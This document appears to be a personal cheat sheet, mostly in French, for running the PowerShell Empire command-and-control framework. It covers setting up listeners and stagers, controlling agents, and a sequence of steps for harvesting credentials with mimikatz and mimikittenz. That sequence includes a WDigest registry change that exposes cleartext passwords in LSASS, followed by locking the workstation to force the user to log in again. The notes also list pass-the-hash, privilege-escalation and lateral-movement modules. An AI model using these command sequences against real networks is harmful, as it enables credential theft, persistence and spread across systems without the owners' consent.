## Empire

ps-empire serveur
ps-empire client

# listeners context
listeners
help
back

# créer un listener
uselistener <wait> 

* killdate - temp de vie du listener
* stagingkey -  key pour chiffrer les communications entre l'agent et le listener 
* workinghours - limite le temps d'activité du listener
* defaultdelay - specifie le delais de reponse ( les agents ne sont pas synchronisés)
 par defaut 5s (l'agent demande des renseignement au listener) , IP deja mise, port 80

set DefaultDelay 1 
set Port 9999 
set Host http://<IP>:9999 
execute 
listeners 

# deployer un agent
usestager <wait> 
options 
set Listener <listener> 
generate 


# active agent
agents 
help 
rename XXXX agent1 
list 
 
interact agent1 
help 
info 

# modules
usemodule <tab> 
	*  code_execution: These modules let you run code, including Metasploit payloads, on the target box. collection: These modules let you pillage information from the target machine. 
	* credentials: These modules let you plunder usernames, hashes, and passwords from the target. 
	* exploitation: These modules let you exploit additional targets. 
	* lateral_movement: These modules let you pivot to other target machines. 
	* management: These modules are associated with system administration functions on the target. 
	* persistence: These modules will make your agent survive across user logoff or reboot. 
	* privesc: These modules provide privilege escalation exploits. 
	* recon: These are the reconnaissance modules. 
* situational_awareness: These modules pull information from the target environment, including scanners and related tools. 
    * trollsploit : troll, play audio, pop dialog 
    
    
usemodule <wait> 
execute 
view 1


# pour le shell
shell <commande>
view 2

# créer un nouveau agent 
psinject http <3304(pid)>

# import script
scriptimport /opt/ps/Sherlock.ps1
scriptcmd Find-AllVulns
jobs

# pour finir
agents 
kill all
y
listeners 
kill all
exit


## modules
situational_awarness/network/powerview/get_user
situational_awarness/network/powerview/get_computer
situational_awarness/network/powerview/find_localadmin_access #connexion sur tous les hosts 
check : shell dir \\<host>\C$


# hash
	* usemodule powershell/credentials/powerdump
	* mimikittenz
	** scriptimport /opt/mimikittenz/Invoke-mimikittenz.ps1
	** scriptcmd Invoke-mimikittenz
	* mimikatz
	** changer la cle de registre pour avoir les mdp dans LSASS # +besoin que le user se reconecte, ici on verouille l'ordinateur pour le pas redemarer 
	** shell reg add
	** HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredentials /t REG_DWORD /d 1 /f
	** shell rundll32.exe user32.dll,LockWorkStation

# PTH
	* credentials/mimikatz/pth
	
# privesc
	* usemodule powershell/privesc/ask

	* If you are already admin, you can attempt to use the classic getsystem module
	* usemodule privesc/getsystem

# lateral mouvement
	* inveigh_relay 					#smbrelay
	* invoke_executemsbuild 	#execute msbild local/remote
	* invoke_psremoting 			#execute stager on host using psremoting
	* invoke_sqloscmd 				# stager on host using xp_cmdshell
	* inkoke_wmi 						#stager on wmi 
	* jenkins_script_console
	* invoke_dcom #MMC20
	* invoke_psexec
	* invoke_smbexec
	* invoke_sshcommand
	* new_gpo_immediate_task
